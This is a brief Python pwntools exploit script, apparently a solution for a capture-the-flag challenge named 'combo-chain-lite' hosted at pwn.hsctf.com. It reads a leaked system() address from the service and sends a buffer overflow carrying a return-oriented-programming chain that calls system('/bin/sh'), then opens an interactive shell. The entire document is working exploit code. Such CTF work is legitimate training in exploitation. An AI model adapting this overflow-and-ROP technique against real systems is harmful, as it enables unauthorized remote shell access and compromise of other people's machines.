#!/usr/bin/env python2
# execve generated by ROPgadget
from pwn import *
from struct import pack

pad = "A"*16
#s = process('./combo-chain-lite')
s = remote('pwn.hsctf.com', 3131)
sys = s.recv()[27:27+14]
print sys
sys = int(sys, 16)

p = ''
p += pack("Q", 0x401273) #address of pop rdi, ret
p += pack("Q", 0x403051) #address off binsh
p += pack("Q", sys)  	 #address off system()

payload = pad + p
s.send(payload)
s.interactive()
